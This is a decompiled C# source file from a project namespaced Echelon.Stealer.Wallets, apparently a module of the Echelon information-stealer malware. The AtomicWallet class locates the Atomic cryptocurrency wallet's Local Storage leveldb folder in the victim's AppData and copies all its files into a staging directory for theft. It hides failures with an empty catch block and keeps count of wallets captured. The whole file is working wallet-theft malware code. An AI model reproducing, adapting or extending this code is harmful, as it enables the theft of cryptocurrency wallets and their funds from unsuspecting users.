using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000009 RID: 9
	internal class AtomicWallet
	{
		// Token: 0x0600002F RID: 47 RVA: 0x00019788 File Offset: 0x00017988
		public static void AtomicStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(AtomicWallet.atomDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(AtomicWallet.atomDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + AtomicWallet.atomDir);
						fileInfo.CopyTo(directorypath + AtomicWallet.atomDir + fileInfo.Name);
					}
					AtomicWallet.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000034 RID: 52
		public static int count;

		// Token: 0x04000035 RID: 53
		public static string atomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";

		// Token: 0x04000036 RID: 54
		public static string atomDir2 = Help.AppDate + "\\atomic\\Local Storage\\leveldb\\";
	}
}
